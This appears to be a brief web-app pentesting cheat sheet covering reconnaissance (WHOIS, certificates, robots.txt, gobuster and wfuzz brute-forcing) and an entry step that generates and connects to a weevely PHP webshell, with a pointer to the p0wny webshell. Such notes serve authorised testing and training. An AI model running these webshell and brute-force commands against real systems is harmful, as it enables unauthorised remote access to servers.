webapp


Webapp pentesting; often juicy low-hanging fruit

Enumeration

OSINT
  • CA and Cert
  • WHOIS
  • robots.txt
Sometimes there's valuable info in the certificate of a website. Make sure to check it, especially if your browser alerts you that something's wrong.
A whois lookup helps sometimes.
whois RHOST
Make sure to check the robots.txt of the website.

GoBuster
  • GoBuster Dir Enumeration
  • Install
Enumerate a site's directories:
gobuster dir -u http://RHOST/ -w /usr/share/wordlists/dirb/common.txt
GoBuster binaries can be found here.

wfuzz
  • wfuzzone
  • wfuzztwo
wfuzz is really cool, it can bruteforce content, fuzz HTTP options, etc. Really nice tool.
wfuzz is really cool, it can bruteforce content, fuzz HTTP options, etc. Really nice tool. #2.

Entry

PHP Shells
  • Weevely PHP Shell Generator
  • p0wny PHP Shell
Weevely can generate compact binding webshells. Build:
weevely generate password ./shell.php
Connect:
weevely RHOST/shell.php password
p0wny binding webshell can be found here.

HTTP Auth
  • Verb Bypass
  • Bruteforcing
